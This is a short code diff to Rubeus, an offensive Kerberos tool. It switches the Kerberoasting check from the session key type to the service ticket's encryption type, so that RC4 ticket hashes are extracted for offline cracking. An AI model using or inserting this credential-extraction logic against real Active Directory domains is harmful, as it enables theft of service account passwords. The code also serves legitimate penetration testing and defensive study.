@@ -533,7 +533,8 @@ namespace Rubeus
             var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
             var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
             var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
-            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);        
+            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
+            var eType = (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype;
             var base64ticket = Convert.ToBase64String(cred.Encode().Encode());
             string indent = new string(' ', indentLevel);
             string serviceName = sname.Split('/')[0];
@@ -601,13 +602,13 @@ namespace Rubeus
                 else if (extractKerberoastHash && (serviceName != "krbtgt"))
                 {
                     // if this isn't a TGT, try to display a Kerberoastable hash
-                    if (!keyType.Equals("rc4_hmac") && !keyType.Equals("aes256_cts_hmac_sha1"))
+                    if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1))
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                         //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
-                        Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
+                        Console.WriteLine("\r\n[!] Service ticket uses encryption type '{0}', unable to extract hash and salt.", eType);
                     }
-                    else if (keyType.Equals("rc4_hmac"))
+                    else if (eType.Equals(Interop.KERB_ETYPE.rc4_hmac))
                     {
                         Roast.DisplayTGShash(cred);
                     }
